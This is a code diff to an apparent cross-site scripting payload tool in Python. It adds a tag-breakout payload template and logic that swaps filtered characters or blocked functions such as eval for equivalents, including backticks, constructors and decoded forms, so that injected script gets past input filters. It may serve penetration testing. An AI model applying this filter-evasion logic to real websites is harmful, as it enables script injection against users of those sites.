@@ -38,7 +38,7 @@ BASE_PAYLOADS = {
     ],
     "ESCAPE_HTML": [
         {
-            "payload": """"/>HTML_PAYLOADTAG_TO_ESCAPE """,
+            "payload": """"/>HTML_PAYLOADTAG_TO_ESCAPE""",
             "used_chars": ['"', '/', '>', '<']
         }
     ]
@@ -67,7 +67,8 @@ def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list
     # replace the failed data with the next possible value
     toRemove = []
     for data in failedData:
-        if data['value'] in lastTestedPayload.usedCharsReplaced:            
+        if data['value'] in lastTestedPayload.usedCharsReplaced:
+            newChar = None            
             if data['type'] == "FUNCTION":  # TODO: improve
                 # if eval is filtered, we try to use the constructor instead
                 if data['value'] == 'eval' and not failedData.__contains__('[') and not failedData.__contains__(']'): 
@@ -98,7 +99,16 @@ def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list
                     newChar = '`'
                 
                 else:
-                    for char in EQUIVALENTS[data['value']]:
+                    if (d:=data['value']) not in EQUIVALENTS:
+                        # get the not encoded associated char (example: %22 is associated with ")
+                        # TODO: do something more efficient
+                        for char in EQUIVALENTS.keys():
+                            if d in EQUIVALENTS[char]:
+                                initial_char = char
+                    else:
+                        initial_char = data['value'] 
+
+                    for char in EQUIVALENTS[initial_char]:
                         if char not in failedData:
                             newChar = char
                             break
